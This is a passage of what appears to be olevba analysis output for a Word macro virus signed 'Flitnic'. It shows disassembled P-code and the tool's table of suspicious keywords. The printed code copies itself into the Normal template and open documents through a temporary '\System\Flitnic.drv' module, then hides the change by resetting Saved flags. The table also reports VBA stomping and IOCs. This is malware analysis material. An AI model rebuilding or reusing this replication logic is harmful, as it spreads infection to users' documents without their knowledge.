' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #352:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #353:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #354:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #355:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #356:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #357:
' 	GoTo look 
' Line #358:
' 	EndIfBlock 
' Line #359:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #360:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo notemp 
' 	EndIf 
' Line #361:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #362:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #363:
' 	EndIfBlock 
' Line #364:
' 	Label notemp 
' Line #365:
' 	EndIfBlock 
' Line #366:
' 	LitDI2 0x0001 
' 	St i 
' Line #367:
' 	Ld Acd 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #368:
' 	CloseAll 
' Line #369:
' 	Label look2 
' Line #370:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St ms 
' Line #371:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld ms 
' 	For 
' Line #372:
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St a 
' Line #373:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Lt 
' 	IfBlock 
' Line #374:
' 	Ld FullCodeD 
' 	Paren 
' 	Ld inn2 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromstring 0x0001 
' Line #375:
' 	LitDI2 0x0014 
' 	St i 
' Line #376:
' 	ExitFor 
' Line #377:
' 	EndIfBlock 
' Line #378:
' 	StartForVariable 
' 	Ld inn2 
' 	EndForVariable 
' 	NextVar 
' Line #379:
' 	Ld i 
' 	LitDI2 0x0014 
' 	Ne 
' 	IfBlock 
' Line #380:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #381:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #382:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld windir 
' 	LitStr 0x0013 "\system\Flitnic.drv"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #383:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #384:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #385:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "Modul1"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #386:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #387:
' 	Ld windir 
' 	LitStr 0x0013 "\System\Flitnic.drv"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #388:
' 	GoTo look2 
' Line #389:
' 	EndIfBlock 
' Line #390:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #391:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo noactsave 
' 	EndIf 
' Line #392:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #393:
' 	Label noactsave 
' Line #394:
' 	ElseBlock 
' Line #395:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #396:
' 	EndIfBlock 
' Line #397:
' 	EndIfBlock 
' Line #398:
' 	Label NoInf 
' Line #399:
' 	Label eb 
' Line #400:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St d 
' Line #401:
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #402:
' 	Ld NormAt 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #403:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #404:
' 	ElseBlock 
' Line #405:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #406:
' 	EndIfBlock 
' Line #407:
' 	QuoteRem 0x0000 0x0024 "First ever used this kind of Stealth"
' Line #408:
' 	QuoteRem 0x0000 0x0035 "Written by Flitnic. I haven't yet included a payload!"
' Line #409:
' 	EndSub 
' Line #410:
' Line #411:
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' Line #416:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |lo.bat              |Executable file name                         |
|IOC       |Attrib.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

